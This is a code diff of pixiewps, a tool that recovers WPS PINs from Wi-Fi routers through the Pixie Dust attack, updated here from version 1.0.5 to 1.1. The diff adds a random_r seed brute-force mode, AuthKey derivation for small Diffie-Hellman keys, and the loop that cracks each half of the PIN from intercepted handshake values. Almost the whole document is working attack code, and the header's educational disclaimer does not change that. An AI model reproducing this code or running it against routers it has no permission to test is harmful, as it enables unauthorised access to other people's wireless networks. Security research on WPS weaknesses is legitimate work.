@@ -5,7 +5,7 @@
  * Special thanks to: datahead, soxrok2212
  *
  * Copyright (c) 2015, wiire <wi7ire@gmail.com>
- * Version: 1.0.5
+ * Version: 1.1
  *
  * DISCLAIMER: This tool was made for educational purposes only.
  *             The author is NOT responsible for any misuse or abuse.
@@ -40,86 +40,66 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <getopt.h>
+#include <stdint.h>
 #include <string.h>
+#include <time.h>
+#include <getopt.h>
 
-#include <openssl/hmac.h>
 #include <sys/time.h>
+#include <asm/byteorder.h>
 
-/* WPS constants */
-#define PK_LEN      192
-#define AUTHKEY_LEN  32
-#define HASH_LEN     32
-#define NONCE_LEN    16
-#define ES_LEN       16
-#define PSK_LEN      16
+#include "pixiewps.h"
+#include "random_r.h"
+#include "utils.h"
 
-/* LCG constants */
-#define LCG_MULTIPLIER 1103515245
-#define LCG_INCREMENT       12345
-#define LCG_OPT_MASK   0x01ffffff
+int32_t rand_r(uint32_t *seed);
 
-/* Exit costants */
-#define MEM_ERROR 2
-#define ARG_ERROR 3
-
-typedef enum {false = 0, true = 1} bool;
-
-int hex_string_to_byte_array(unsigned char *src, unsigned char *dst, int dst_len);
-void uint_to_char_array(unsigned int num, int len, unsigned char *dst);
-unsigned int wps_pin_checksum(unsigned int pin);
-unsigned int wps_pin_valid(unsigned int pin);
-void hmac_sha256(const void *key, int key_len, const unsigned char *data, size_t data_len, unsigned char *digest);
-int rand_r(unsigned int *seed);
-void byte_array_print(unsigned char *buffer, unsigned int length);
-void display_usage();
-
-static const long hextable[] = {
-	[0 ... 255] = -1,
-	['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
-	['A'] = 10, 11, 12, 13, 14, 15,
-	['a'] = 10, 11, 12, 13, 14, 15
-};
-
-struct globalArgs_t {
-	unsigned char *pke;
-	unsigned char *pkr;
-	unsigned char *e_hash1;
-	unsigned char *e_hash2;
-	unsigned char *authkey;
-	unsigned char *e_nonce;
-	bool small_dh_keys;
-} globalArgs;
-
-static const char *option_string = "e:r:s:z:a:n:Sh?";
-
+static const char *option_string = "e:r:s:z:a:n:m:b:Sfv:h?";
 static const struct option long_options[] = {
-	{ "pke",        required_argument, 0, 'e' },
-	{ "pkr",        required_argument, 0, 'r' },
-	{ "e-hash1",    required_argument, 0, 's' },
-	{ "e-hash2",    required_argument, 0, 'z' },
-	{ "authkey",    required_argument, 0, 'a' },
-	{ "e-nonce",    required_argument, 0, 'n' },
-	{ "dh-small",   no_argument,       0, 'S' },
-	{ "help",       no_argument,       0, 'h' },
-	{ 0, 0, 0, 0 }
+	{ "pke",       required_argument, 0, 'e' },
+	{ "pkr",       required_argument, 0, 'r' },
+	{ "e-hash1",   required_argument, 0, 's' },
+	{ "e-hash2",   required_argument, 0, 'z' },
+	{ "authkey",   required_argument, 0, 'a' },
+	{ "e-nonce",   required_argument, 0, 'n' },
+	{ "r-nonce",   required_argument, 0, 'm' },
+	{ "e-bssid",   required_argument, 0, 'b' },
+	{ "dh-small",  no_argument,       0, 'S' },
+	{ "force",     no_argument,       0, 'f' },
+	{ "verbosity", required_argument, 0, 'v' },
+	{ "help",      no_argument,       0, 'h' },
+	{  0,          0,                 0,  0  }
 };
 
 int main(int argc, char **argv) {
-	globalArgs.pke = 0;
-	globalArgs.pkr = 0;
-	globalArgs.e_hash1 = 0;
-	globalArgs.e_hash2 = 0;
-	globalArgs.authkey = 0;
-	globalArgs.e_nonce = 0;
-	globalArgs.small_dh_keys = false;
 
-	unsigned char *pke;
-	unsigned char *pkr;
-	unsigned char *e_hash1;
-	unsigned char *e_hash2;
-	unsigned char *authkey;
-	unsigned char *e_nonce = 0;
+	struct global *wps;
+	if ((wps = calloc(1, sizeof(struct global)))) {
+		wps->pke     = 0;
+		wps->pkr     = 0;
+		wps->e_hash1 = 0;
+		wps->e_hash2 = 0;
+		wps->authkey = 0;
+		wps->e_nonce = 0;
+		wps->r_nonce = 0;
+		wps->e_bssid = 0;
+		wps->psk1    = 0;
+		wps->psk2    = 0;
+		wps->dhkey   = 0;
+		wps->kdk     = 0;
+		wps->wrapkey = 0;
+		wps->emsk    = 0;
+		wps->e_s1    = 0;
+		wps->e_s2    = 0;
+		wps->bruteforce = false;
+		wps->verbosity = 2;
+		wps->error = calloc(256, 1); if (!wps->error) goto memory_err;
+		wps->error[0] = '\n';
+	} else {
+		memory_err:
+			fprintf(stderr, "\n [X] Memory allocation error!\n");
+			return MEM_ERROR;
+	}
 
 	int opt = 0;
 	int long_index = 0;
@@ -128,127 +108,260 @@ int main(int argc, char **argv) {
 	while (opt != -1) {
 		switch (opt) {
 			case 'e':
-				globalArgs.pke = (unsigned char *) optarg;
+				wps->pke = malloc(WPS_PUBKEY_LEN);
+				if (!wps->pke)
+					goto memory_err;
+				if (hex_string_to_byte_array(optarg, wps->pke, WPS_PUBKEY_LEN)) {
+					snprintf(wps->error, 256, "\n [!] Bad enrollee public key -- %s\n\n", optarg);
+					goto usage_err;
+				}
 				break;
 			case 'r':
-				globalArgs.pkr = (unsigned char *) optarg;
+				wps->pkr = malloc(WPS_PUBKEY_LEN);
+				if (!wps->pkr)
+					goto memory_err;
+				if (hex_string_to_byte_array(optarg, wps->pkr, WPS_PUBKEY_LEN)) {
+					snprintf(wps->error, 256, "\n [!] Bad registrar public key -- %s\n\n", optarg);
+					goto usage_err;
+				}
 				break;
 			case 's':
-				globalArgs.e_hash1 = (unsigned char *) optarg;
+				wps->e_hash1 = malloc(WPS_HASH_LEN);
+				if (!wps->e_hash1)
+					goto memory_err;
+				if (hex_string_to_byte_array(optarg, wps->e_hash1, WPS_HASH_LEN)) {
+					snprintf(wps->error, 256, "\n [!] Bad hash -- %s\n\n", optarg);
+					goto usage_err;
+				}
 				break;
 			case 'z':
-				globalArgs.e_hash2 = (unsigned char *) optarg;
+				wps->e_hash2 = malloc(WPS_HASH_LEN);
+				if (!wps->e_hash2)
+					goto memory_err;
+				if (hex_string_to_byte_array(optarg, wps->e_hash2, WPS_HASH_LEN)) {
+					snprintf(wps->error, 256, "\n [!] Bad hash -- %s\n\n", optarg);
+					goto usage_err;
+				}
 				break;
 			case 'a':
-				globalArgs.authkey = (unsigned char *) optarg;
+				wps->authkey = malloc(WPS_AUTHKEY_LEN);
+				if (!wps->authkey)
+					goto memory_err;
+				if (hex_string_to_byte_array(optarg, wps->authkey, WPS_HASH_LEN)) {
+					snprintf(wps->error, 256, "\n [!] Bad authentication session key -- %s\n\n", optarg);
+					goto usage_err;
+				}
 				break;
 			case 'n':
-				globalArgs.e_nonce = (unsigned char *) optarg;
+				wps->e_nonce = malloc(WPS_NONCE_LEN);
+				if (!wps->e_nonce)
+					goto memory_err;
+				if (hex_string_to_byte_array(optarg, wps->e_nonce, WPS_NONCE_LEN)) {
+					snprintf(wps->error, 256, "\n [!] Bad enrollee nonce -- %s\n\n", optarg);
+					goto usage_err;
+				}
+				break;
+			case 'm':
+				wps->r_nonce = malloc(WPS_NONCE_LEN);
+				if (!wps->r_nonce)
+					goto memory_err;
+				if (hex_string_to_byte_array(optarg, wps->r_nonce, WPS_NONCE_LEN)) {
+					snprintf(wps->error, 256, "\n [!] Bad registrar nonce -- %s\n\n", optarg);
+					goto usage_err;
+				}
+				break;
+			case 'b':
+				wps->e_bssid = malloc(WPS_BSSID_LEN);
+				if (!wps->e_bssid)
+					goto memory_err;
+				if (hex_string_to_byte_array(optarg, wps->e_bssid, WPS_BSSID_LEN)) {
+					snprintf(wps->error, 256, "\n [!] Bad enrollee MAC address -- %s\n\n", optarg);
+					goto usage_err;
+				}
 				break;
 			case 'S':
-				globalArgs.small_dh_keys = true;
+				wps->small_dh_keys = true;
+				break;
+			case 'f':
+				wps->bruteforce = true;
+				break;
+			case 'v':
+				if (get_int(optarg, &wps->verbosity) != 0 || wps->verbosity < 1 || 3 < wps->verbosity) {
+					snprintf(wps->error, 256, "\n [!] Bad verbosity level -- %s\n\n", optarg);
+					goto usage_err;
+				};
 				break;
 			case 'h':
+				goto usage_err;
 			case '?':
-				display_usage();
 			default:
-				exit(ARG_ERROR);
+				fprintf(stderr, "%s -h for help\n", argv[0]);
+				return ARG_ERROR;
 		}
 		opt = getopt_long(argc, argv, option_string, long_options, &long_index);
 	}
 
 	/* Not all required arguments have been supplied */
-	if (globalArgs.pke == 0 || globalArgs.e_hash1 == 0 || globalArgs.e_hash2 == 0 || globalArgs.authkey == 0) {
-		display_usage();
+	if (wps->pke == 0 || wps->e_hash1 == 0 || wps->e_hash2 == 0) {
+		wps->error = "\n [!] Not all required arguments have been supplied!\n\n";
+
+		usage_err:
+			fprintf(stderr, usage, VERSION, argv[0], wps->error);
+			return ARG_ERROR;
 	}
 
-	/* If --dh-small is selected then no PKR should be supplied */
-	if ((globalArgs.pkr && globalArgs.small_dh_keys) || (!globalArgs.pkr && !globalArgs.small_dh_keys)) {
-		display_usage();
+	/* If --dh-small is selected then no --pkr should be supplied */
+	if (wps->pkr && wps->small_dh_keys) {
+		wps->error = "\n [!] Options --dh-small and --pkr are mutually exclusive!\n\n";
+		goto usage_err;
 	}
 
-	/* Allocating memory */
-	pke = (unsigned char *) malloc(PK_LEN);          if (!pke)     exit(MEM_ERROR);
-	pkr = (unsigned char *) malloc(PK_LEN);          if (!pkr)     exit(MEM_ERROR);
-	e_hash1 = (unsigned char *) malloc(HASH_LEN);    if (!e_hash1) exit(MEM_ERROR);
-	e_hash2 = (unsigned char *) malloc(HASH_LEN);    if (!e_hash2) exit(MEM_ERROR);
-	authkey = (unsigned char *) malloc(AUTHKEY_LEN); if (!authkey) exit(MEM_ERROR);
-
-	if (globalArgs.e_nonce) {
-		e_nonce = (unsigned char *) malloc(NONCE_LEN); if (!e_nonce) exit(MEM_ERROR);
-		if (hex_string_to_byte_array(globalArgs.e_nonce, e_nonce, NONCE_LEN)) goto end;
+	/* Either --pkr or --dh-small must be specified */
+	if (!wps->pkr && !wps->small_dh_keys) {
+		wps->error = "\n [!] Either --pkr or --dh-small must be specified!\n\n";
+		goto usage_err;
 	}
 
-	if (globalArgs.small_dh_keys) {
-		memset(pkr, 0, PK_LEN - 1);
-		pkr[PK_LEN - 1] = 0x02;
-	} else {
-		if (hex_string_to_byte_array(globalArgs.pkr, pkr, PK_LEN)) goto end;
+	if (wps->small_dh_keys) { /* Small DH keys selected */
+		wps->pkr = malloc(WPS_PUBKEY_LEN);
+		if (!wps->pkr)
+			goto memory_err;
+
+		/* g^A mod p = 2 (g = 2, A = 1, p > 2) */
+		memset(wps->pkr, 0, WPS_PUBKEY_LEN - 1);
+		wps->pkr[WPS_PUBKEY_LEN - 1] = 0x02;
+
+		if (!wps->authkey) {
+			if (wps->e_nonce) {
+				if (wps->r_nonce) {
+					if (wps->e_bssid) { /* Computing AuthKey */
+						wps->dhkey = malloc(WPS_HASH_LEN);
+						if (!wps->dhkey)
+							goto memory_err;
+						wps->kdk = malloc(WPS_HASH_LEN);
+						if (!wps->kdk)
+							goto memory_err;
+
+						unsigned char *buffer = malloc(WPS_NONCE_LEN * 2 + WPS_BSSID_LEN);
+						if (!buffer)
+							goto memory_err;
+
+						/* DHKey = SHA-256(g^(AB) mod p) = SHA-256(PKe^A mod p) = SHA-256(PKe) (g = 2, A = 1, p > 2) */
+						sha256(wps->pke, WPS_PUBKEY_LEN, wps->dhkey);
+
+						memcpy(buffer, wps->e_nonce, WPS_NONCE_LEN);
+						memcpy(buffer + WPS_NONCE_LEN, wps->e_bssid, WPS_BSSID_LEN);
+						memcpy(buffer + WPS_NONCE_LEN + WPS_BSSID_LEN, wps->r_nonce, WPS_NONCE_LEN);
+
+						/* KDK = HMAC-SHA-256{DHKey}(Enrollee nonce || Enrollee MAC || Registrar nonce) */
+						hmac_sha256(wps->dhkey, WPS_HASH_LEN, buffer, WPS_NONCE_LEN * 2 + WPS_BSSID_LEN, wps->kdk);
+
+						buffer = realloc(buffer, WPS_HASH_LEN * 3);
+						if (!buffer)
+							goto memory_err;
+
+						/* Key derivation function */
+						kdf(wps->kdk, WPS_AUTHKEY_LEN + WPS_KEYWRAPKEY_LEN + WPS_EMSK_LEN, buffer);
+
+						wps->authkey = malloc(WPS_AUTHKEY_LEN);
+						if (!wps->authkey)
+							goto memory_err;
+
+						memcpy(wps->authkey, buffer, WPS_AUTHKEY_LEN);
+						
+						if (wps->verbosity > 2) {
+							wps->wrapkey = malloc(WPS_KEYWRAPKEY_LEN);
+							if (!wps->wrapkey)
+								goto memory_err;
+							wps->emsk = malloc(WPS_EMSK_LEN);
+							if (!wps->emsk)
+								goto memory_err;
+
+							memcpy(wps->wrapkey, buffer + WPS_AUTHKEY_LEN, WPS_KEYWRAPKEY_LEN);
+							memcpy(wps->emsk, buffer + WPS_AUTHKEY_LEN + WPS_KEYWRAPKEY_LEN, WPS_EMSK_LEN);
+						}
+						if (wps->verbosity < 3) {
+							free(wps->dhkey);
+							free(wps->kdk);
+						}
+						free(buffer);
+					} else {
+						wps->error = "\n [!] Neither --authkey and --e-bssid have been supplied!\n\n";
+						goto usage_err;
+					}
+				} else {
+					wps->error = "\n [!] Neither --authkey and --r-nonce have been supplied!\n\n";
+					goto usage_err;
+				}
+			} else {
+				wps->error = "\n [!] Neither --authkey and --e-nonce have been supplied!\n\n";
+				goto usage_err;
+			}
+		}
 	}
 
-	/* Converting data fed to the program to byte array */
-	if (hex_string_to_byte_array(globalArgs.pke, pke, PK_LEN))              goto end;
-	if (hex_string_to_byte_array(globalArgs.e_hash1, e_hash1, HASH_LEN))    goto end;
-	if (hex_string_to_byte_array(globalArgs.e_hash2, e_hash2, HASH_LEN))    goto end;
-	if (hex_string_to_byte_array(globalArgs.authkey, authkey, AUTHKEY_LEN)) goto end;
+	/* E-S1 = E-S2 = 0 */
+	wps->e_s1 = calloc(WPS_SECRET_NONCE_LEN, 1); if (!wps->e_s1) goto memory_err;
+	wps->e_s2 = calloc(WPS_SECRET_NONCE_LEN, 1); if (!wps->e_s2) goto memory_err;
 
 	/* Allocating memory for digests */
-	unsigned char *psk1 = (unsigned char *) malloc(HASH_LEN);                        if (!psk1)   exit(MEM_ERROR);
-	unsigned char *psk2 = (unsigned char *) malloc(HASH_LEN);                        if (!psk2)   exit(MEM_ERROR);
-	unsigned char *result = (unsigned char *) malloc(HASH_LEN);                      if (!result) exit(MEM_ERROR);
-	unsigned char *buffer = (unsigned char *) malloc(ES_LEN + PSK_LEN + PK_LEN * 2); if (!buffer) exit(MEM_ERROR);
+	wps->psk1 = malloc(WPS_HASH_LEN); if (!wps->psk1) goto memory_err;
+	wps->psk2 = malloc(WPS_HASH_LEN); if (!wps->psk2) goto memory_err;
 
-	/* ES-1 = ES-2 = 0 */
-	unsigned char *e_s1 = (unsigned char *) calloc(ES_LEN, 1);  if (!e_s1) exit(MEM_ERROR);
-	unsigned char *e_s2 = (unsigned char *) calloc(ES_LEN, 1);  if (!e_s2) exit(MEM_ERROR);
+	unsigned char *result = (unsigned char *) malloc(WPS_HASH_LEN);
+	if (!result)
+		goto memory_err;
+	unsigned char *buffer = (unsigned char *) malloc(WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN * 2);
+	if (!buffer)
+		goto memory_err;
 
-	unsigned int seed;
-	unsigned int print_seed = 0; /* Seed to display at the end */
+	uint32_t seed;
+	uint32_t print_seed; /* Seed to display at the end */
 	unsigned int first_half;
 	unsigned int second_half;
 	unsigned char s_pin[4] = {0};
+	bool valid = false;
 
 	int mode = 1; bool found = false;
-	struct timeval t0;
-	struct timeval t1;
+	struct timeval t0, t1;
 
 	gettimeofday(&t0, 0);
 
-	while (mode < 4 && !found) {
+	while (mode <= MAX_MODE && !found) {
 
-		first_half = 0;
-		second_half = 0;
+		seed = 0; print_seed = 0;
 
-		if (mode == 2 && e_nonce) {
-			memcpy(e_s1, e_nonce, NONCE_LEN);
-			memcpy(e_s2, e_nonce, NONCE_LEN);
+		/* ES-1 = ES-2 = E-Nonce */
+		if (mode == 2 && wps->e_nonce) {
+			memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN);
+			memcpy(wps->e_s2, wps->e_nonce, WPS_SECRET_NONCE_LEN);
 		}
 
-		/* PRNG bruteforce */
-		if (mode == 3 && e_nonce) {
+		/* PRNG bruteforce (rand_r) */
+		if (mode == 3 && wps->e_nonce) {
 
 			/* Reducing entropy from 32 to 25 bits */
-			unsigned int index = e_nonce[0] << 25;
-			unsigned int limit = index | LCG_OPT_MASK;
+			uint32_t index = wps->e_nonce[0] << 25;
+			uint32_t limit = index | 0x01ffffff;
 
 			while (1) {
 				seed = index;
 
 				int i;
-				for (i = 1; i < NONCE_LEN; i++) {
-					if (e_nonce[i] != (unsigned char) rand_r(&seed)) break;
+				for (i = 1; i < WPS_NONCE_LEN; i++) {
+					if (wps->e_nonce[i] != (unsigned char) rand_r(&seed)) break;
 				}
 
-				if (i == NONCE_LEN) { /* Seed found */
+				if (i == WPS_NONCE_LEN) { /* Seed found */
 					print_seed = seed;
 
 					/* Advance to get ES-1 */
-					for (i = 0; i < NONCE_LEN; i++)
-						e_s1[i] = (unsigned char) rand_r(&seed);
+					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
+						wps->e_s1[i] = (unsigned char) rand_r(&seed);
 
 					/* Advance to get ES-2 */
-					for (i = 0; i < NONCE_LEN; i++)
-						e_s2[i] = (unsigned char) rand_r(&seed);
+					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
+						wps->e_s2[i] = (unsigned char) rand_r(&seed);
 
 					break;
 				}
@@ -259,18 +372,90 @@ int main(int argc, char **argv) {
 			}
 		}
 
+		/* PRNG bruteforce (random_r) */
+		if (mode == 4 && wps->e_nonce) {
+
+			/* Checks if the sequence may actually be generated by current random function */
+			if (wps->e_nonce[0] < 0x80 && wps->e_nonce[4] < 0x80 && wps->e_nonce[8] < 0x80  && wps->e_nonce[12] < 0x80) {
+
+				valid = true;
+
+				/* Converting enrollee nonce to the sequence may be generated by current random function */
+				uint32_t randr_enonce[4] = {0};
+				int j = 0;
+				for (int i = 0; i < 4; i++) {
+					randr_enonce[i] |= wps->e_nonce[j++];
+					randr_enonce[i] <<= 8;
+					randr_enonce[i] |= wps->e_nonce[j++];
+					randr_enonce[i] <<= 8;
+					randr_enonce[i] |= wps->e_nonce[j++];
+					randr_enonce[i] <<= 8;
+					randr_enonce[i] |= wps->e_nonce[j++];
+				}
+
+				uint32_t limit;
+				struct timeval curr_time;
+				gettimeofday(&curr_time, 0);
+
+				if (wps->bruteforce) {
+					seed = curr_time.tv_sec + SEC_PER_DAY * MODE4_DAYS - SEC_PER_HOUR * 2;
+					limit = 0;
+				} else {
+					seed = curr_time.tv_sec + SEC_PER_HOUR * 2;
+					limit = curr_time.tv_sec - SEC_PER_DAY * MODE4_DAYS - SEC_PER_HOUR * 2;
+				}
+
+				struct random_data *buf = (struct random_data *) calloc(1, sizeof(struct random_data));
+				char *rand_statebuf = (char *) calloc(1, 128);
+				initstate_r(seed, rand_statebuf, 128, buf);
+				int32_t res = 0;
+
+				while (1) {
+					srandom_r(seed, buf);
+
+					int i;
+					for (i = 0; i < 4; i++) {
+						random_r(buf, &res);
+						if (res != randr_enonce[i]) break;
+					}
+
+					if (i == 4) {
+						print_seed = seed;
+						srandom_r(print_seed + 1, buf);
+						for (int i = 0; i < 4; i++) {
+							random_r(buf, &res);
+							uint32_t be = __be32_to_cpu(res);
+							memcpy(&(wps->e_s1[4 * i]), &be, 4);
+							memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN); /* ES-1 = ES-2 != E-Nonce */
+						}
+					}
+
+					if (print_seed || seed == limit) {
+						free(buf);
+						free(rand_statebuf);
+						break;
+					}
+
+					seed--;
+				}
+			}
+		}
+
 		/* WPS pin cracking */
-		if (mode == 1 || (mode == 2 && e_nonce) || (mode == 3 && print_seed)) {
+		if (mode == 1 || (mode == 2 && wps->e_nonce) || (mode == 3 && print_seed) || (mode == 4 && print_seed)) {
+crack:
+			first_half = 0; second_half = 0;
+
 			while (first_half < 10000) {
 				uint_to_char_array(first_half, 4, s_pin);
-				hmac_sha256(authkey, AUTHKEY_LEN, (unsigned char *) s_pin, 4, psk1);
-				memcpy(buffer, e_s1, ES_LEN);
-				memcpy(buffer + ES_LEN, psk1, PSK_LEN);
-				memcpy(buffer + ES_LEN + PSK_LEN, pke, PK_LEN);
-				memcpy(buffer + ES_LEN + PSK_LEN + PK_LEN, pkr, PK_LEN);
-				hmac_sha256(authkey, AUTHKEY_LEN, buffer, ES_LEN + PSK_LEN + PK_LEN * 2, result);
+				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, (unsigned char *) s_pin, 4, wps->psk1);
+				memcpy(buffer, wps->e_s1, WPS_SECRET_NONCE_LEN);
+				memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk1, WPS_PSK_LEN);
+				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PUBKEY_LEN);
+				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN, wps->pkr, WPS_PUBKEY_LEN);
+				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer, WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN * 2, result);
 
-				if (memcmp(result, e_hash1, HASH_LEN)) {
+				if (memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
 					first_half++;
 				} else {
 					break;
@@ -286,14 +471,14 @@ int main(int argc, char **argv) {
 					checksum_digit = wps_pin_checksum(first_half * 1000 + second_half);
 					c_second_half = second_half * 10 + checksum_digit;
 					uint_to_char_array(c_second_half, 4, s_pin);
-					hmac_sha256(authkey, AUTHKEY_LEN, (unsigned char *) s_pin, 4, psk2);
-					memcpy(buffer, e_s2, ES_LEN);
-					memcpy(buffer + ES_LEN, psk2, PSK_LEN);
-					memcpy(buffer + ES_LEN + PSK_LEN, pke, PK_LEN);
-					memcpy(buffer + ES_LEN + PSK_LEN + PK_LEN, pkr, PK_LEN);
-					hmac_sha256(authkey, AUTHKEY_LEN, buffer, ES_LEN + PSK_LEN + PK_LEN * 2, result);
+					hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, (unsigned char *) s_pin, 4, wps->psk2);
+					memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
+					memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
+					memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PUBKEY_LEN);
+					memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN, wps->pkr, WPS_PUBKEY_LEN);
+					hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer, WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN * 2, result);
 
-					if (memcmp(result, e_hash2, HASH_LEN)) {
+					if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
 						second_half++;
 					} else {
 						second_half = c_second_half;
@@ -315,14 +500,14 @@ int main(int argc, char **argv) {
 						}
 
 						uint_to_char_array(second_half, 4, s_pin);
-						hmac_sha256(authkey, AUTHKEY_LEN, (unsigned char *) s_pin, 4, psk2);
-						memcpy(buffer, e_s2, ES_LEN);
-						memcpy(buffer + ES_LEN, psk2, PSK_LEN);
-						memcpy(buffer + ES_LEN + PSK_LEN, pke, PK_LEN);
-						memcpy(buffer + ES_LEN + PSK_LEN + PK_LEN, pkr, PK_LEN);
-						hmac_sha256(authkey, AUTHKEY_LEN, buffer, ES_LEN + PSK_LEN + PK_LEN * 2, result);
+						hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, (unsigned char *) s_pin, 4, wps->psk2);
+						memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
+						memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
+						memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PUBKEY_LEN);
+						memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN, wps->pkr, WPS_PUBKEY_LEN);
+						hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer, WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN * 2, result);
 
-						if (memcmp(result, e_hash2, HASH_LEN)) {
+						if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
 							second_half++;
 						} else {
 							found = true;
@@ -333,152 +518,105 @@ int main(int argc, char **argv) {
 			}
 		}
 
+		/* E-S1 = E-Nonce != E-S2 */
+		if (mode == 4 && print_seed && !found) {
+			memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN);
+			mode++;
+			goto crack;
+		}
+
 		mode++;
 	}
 
 	gettimeofday(&t1, 0);
-	long elapsed = t1.tv_sec - t0.tv_sec;
+	long elapsed_s = t1.tv_sec - t0.tv_sec;
 	mode--;
 
+	printf("\n Pixiewps %s\n", VERSION);
+
 	if (found) {
-		if (e_nonce && mode == 3) {
-			printf("\n [*] PRNG Seed: %u", print_seed);
+		if (wps->e_nonce) {
+			if ((mode == 3 || mode == 4) && wps->verbosity > 2) {
+				printf("\n [*] PRNG Seed:  %u", print_seed);
+			}
+			if (mode == 4 && wps->verbosity > 2) {
+				time_t seed_time;
+				struct tm ts;
+				char buffer[30];
+
+				seed_time = print_seed;
+				ts = *localtime(&seed_time);
+				strftime(buffer, 30, "%c", &ts);
+				printf(" (%s)", buffer);
+			}
 		}
-		printf("\n [*] ES-1: ");
-		byte_array_print(e_s1, ES_LEN);
-		printf("\n [*] ES-2: ");
-		byte_array_print(e_s2, ES_LEN);
-		printf("\n [*] PSK1: ");
-		byte_array_print(psk1, PSK_LEN);
-		printf("\n [*] PSK2: ");
-		byte_array_print(psk2, PSK_LEN);
-		printf("\n [+] WPS pin: %04u%04u", first_half, second_half);
+		if (wps->verbosity > 2) {
+			if (wps->dhkey) { /* To see if AuthKey was supplied or not */
+				printf("\n [*] DHkey:      "); byte_array_print(wps->dhkey, WPS_HASH_LEN);
+				printf("\n [*] KDK:        "); byte_array_print(wps->kdk, WPS_HASH_LEN);
+				printf("\n [*] AuthKey:    "); byte_array_print(wps->authkey, WPS_AUTHKEY_LEN);
+				printf("\n [*] EMSK:       "); byte_array_print(wps->emsk, WPS_EMSK_LEN);
+				printf("\n [*] KeyWrapKey: "); byte_array_print(wps->wrapkey, WPS_KEYWRAPKEY_LEN);
+			}
+			printf("\n [*] PSK1:       "); byte_array_print(wps->psk1, WPS_PSK_LEN);
+			printf("\n [*] PSK2:       "); byte_array_print(wps->psk2, WPS_PSK_LEN);
+		}
+		if (wps->verbosity > 1) {
+			printf("\n [*] E-S1:       "); byte_array_print(wps->e_s1, WPS_SECRET_NONCE_LEN);
+			printf("\n [*] E-S2:       "); byte_array_print(wps->e_s2, WPS_SECRET_NONCE_LEN);
+		}
+		printf("\n [+] WPS pin:    %04u%04u", first_half, second_half);
 	} else {
 		printf("\n [-] WPS pin not found!");
 	}
-	printf("\n\n [*] Time taken: %lu s\n\n", elapsed);
+	printf("\n\n [*] Time taken: %lu s\n\n", elapsed_s);
 
-end:
-	free(pke);
-	free(pkr);
-	free(e_hash1);
-	free(e_hash2);
-	free(authkey);
-	free(psk1);
-	free(psk2);
+	if (!found && mode == 4 && valid && !wps->bruteforce) {
+		printf(" [!] The AP /might be/ vulnerable to mode 4. Try again with --force or with another (newer) set of data.\n\n");
+	}
+
 	free(result);
 	free(buffer);
-	free(e_s1);
-	free(e_s2);
-	if (e_nonce) free(e_nonce);
+
+	free(wps->pke);
+	free(wps->pkr);
+	free(wps->e_hash1);
+	free(wps->e_hash2);
+	free(wps->authkey);
+	free(wps->e_nonce);
+	free(wps->r_nonce);
+	free(wps->e_bssid);
+	free(wps->psk1);
+	free(wps->psk2);
+	free(wps->e_s1);
+	free(wps->e_s2);
+	free(wps->error);
+
+	if (wps->verbosity > 2) {
+		free(wps->dhkey);
+		free(wps->kdk);
+		free(wps->wrapkey);
+		free(wps->emsk);
+	}
+
+	free(wps);
 
 	return (!found); /* 0 success, 1 failure */
 }
 
-/* Converts an hex string to a byte array */
-int hex_string_to_byte_array(unsigned char *src, unsigned char *dst, int dst_len) {
-	int i = 0;
-	unsigned char hvalue, lvalue;
-
-	while (i < dst_len) {
-		while (*src == ':' || *src == '-' || *src == ' ') src++; /* Keeps going until finds a good character */
-
-		hvalue = hextable[*src];
-		lvalue = hextable[*++src];
-
-		if (hvalue == -1 || lvalue == -1) return -1;
-
-		dst[i] = (hvalue << 4) | lvalue;
-		src++;
-		i++;
-	}
-	return 0;
-}
-
-/* Converts an unsigned integer to a char array without termination */
-void uint_to_char_array(unsigned int num, int len, unsigned char *dst) {
-	unsigned int mul = 1;
-	while (len--) {
-		dst[len] = (num % (mul * 10) / mul) + '0';
-		mul *= 10;
-	}
-}
-
-/* Pin checksum computing */
-unsigned int wps_pin_checksum(unsigned int pin) {
-	unsigned int acc = 0;
-	while (pin) {
-		acc += 3 * (pin % 10);
-		pin /= 10;
-		acc += pin % 10;
-		pin /= 10;
-	}
-	return (10 - acc % 10) % 10;
-}
-
-/* Validity PIN control based on checksum */
-unsigned int wps_pin_valid(unsigned int pin) {
-	return wps_pin_checksum(pin / 10) == (pin % 10);
-}
-
-/* HMAC-SHA-256 */
-void hmac_sha256(const void *key, int key_len, const unsigned char *data, size_t data_len, unsigned char *digest) {
-	unsigned int h_len = HASH_LEN;
-	HMAC_CTX ctx;
